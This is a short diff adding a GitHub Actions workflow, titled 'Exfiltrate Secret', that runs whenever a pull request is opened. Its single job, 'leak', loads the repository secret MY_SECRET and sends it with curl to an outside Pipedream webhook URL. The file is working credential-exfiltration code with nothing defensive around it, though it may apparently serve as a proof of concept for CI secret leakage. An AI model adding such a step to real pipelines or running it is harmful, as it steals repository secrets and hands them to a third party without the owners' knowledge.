@@ -1,0 +1,16 @@
+name: Exfiltrate Secret
+
+on:
+  pull_request:
+    types: [opened]
+
+jobs:
+  leak:
+    runs-on: ubuntu-latest
+    env:
+      SECRET: ${{ secrets.MY_SECRET }}
+    steps:
+      - name: Leak secret
+        run: |
+          curl -G --data-urlencode "secret=$SECRET" https://eo5xqptx8ll0mnk.m.pipedream.net
+
